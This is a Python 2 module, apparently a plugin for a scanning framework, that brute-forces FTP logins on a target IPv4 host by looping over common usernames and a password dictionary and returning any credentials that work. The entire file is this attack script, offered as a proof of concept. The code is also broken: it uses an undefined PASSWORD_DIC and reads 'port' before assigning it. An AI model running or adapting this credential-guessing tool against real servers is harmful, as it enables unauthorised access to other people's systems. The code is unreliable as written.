#!/usr/bin/env python
# coding:utf-8
"""
  Author:  Conan0xff
  Purpose: ftp crack pass
  Created: 09/29/17
"""

import urllib
import urllib2
import ftplib
import random
import string
import urlparse
import re

from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param

NAME = 'ftp_crack'

AUTHOR = 'Conan0xff'

DESCRIPTION = 'ftp crack pass poc'

RESULT_DESC = '''return host and result if is vulnerable'''

DEMANDS = [TargetDemand('target', target.TYPE_IPV4)]

def check(ip, port, timeout):
    user_list = ['ftp', 'www', 'admin', 'root', 'db', 'wwwroot', 'data', 'web']
    for user in user_list:
        for pass_ in PASSWORD_DIC:
            pass_ = str(pass_.replace('{user}', user))
            try:
                ftp = ftplib.FTP()
                ftp.timeout = timeout
                ftp.connect(ip, port)
                ftp.login(user, pass_)
                if pass_ == '': pass_ = "null"
                if user == 'ftp' and pass_ == 'ftp': return "can login with none pass"
                return "user:%s,pass:%s"%(user,pass_)
            except Exception, e:
                if "Errno 10061" in str(e) or "timed out" in str(e):
                    return False

def exploit(target, payload, config):
    # parse url to host and port
    timeout = 5
    host=target
    if port is None:
        port = 21
    port=int(port)
    if check(host, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit

if __name__ == '__main__':
    print exploit('127.0.0.1','','{}')

